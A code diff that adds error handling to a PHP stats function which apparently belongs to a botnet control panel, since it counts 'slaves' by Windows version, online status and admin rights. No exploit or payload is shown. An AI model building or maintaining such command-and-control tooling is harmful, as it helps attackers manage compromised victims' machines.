@@ -11,10 +11,21 @@ function getStats($conn)
       (SELECT DISTINCT COUNT(id) FROM slaves WHERE slaveStatus='online') as TotalOnline,
       (SELECT COUNT(id) FROM slaves WHERE slaveIsAdmin='TRUE') as TotalAdmins
   FROM  slaves");
-  $botDetails->execute();
-  $botDetails->store_result();
-  $botDetails->bind_result($totalMachines,$Win10Count,$Server2012Count,$Server2016Count,$Server2008Count,$Windows8Count, $totalOnline, $totalAdmins);
-  $botDetails->fetch();
+	if($botDetails !== false)
+  	  {
+	     $errorControl = $botDetails->execute();
+		if($errorControl !== false)
+		{
+			$botDetails->store_result();
+  			$botDetails->bind_result($totalMachines,$Win10Count,$Server2012Count,$Server2016Count,$Server2008Count,$Windows8Count, $totalOnline, $totalAdmins);
+  			$botDetails->fetch();
+		}
+ 	     else
+		return "An error occured: ". $botDetails->error;
+	}
+	else
+	    return "An error occured: ". $conn->error;
+	   
 
   if($totalMachines != 0){
   $Server2016Percentage = 100 * $Server2016Count / $totalMachines;
